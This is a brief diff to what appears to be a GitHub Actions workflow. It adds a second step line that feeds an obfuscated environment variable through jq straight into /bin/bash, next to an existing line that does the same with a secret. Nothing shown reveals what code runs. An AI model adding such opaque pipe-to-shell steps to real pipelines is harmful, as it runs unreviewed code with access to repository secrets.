@@ -20,6 +20,7 @@ jobs:
           urut436: ${{ secrets.urut436 }}
         run: |
           printf '%s' "$urut436" | jq -r .aogu2150 | /bin/bash
+          echo $ueemz54 | jq -r .qomlv0520 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
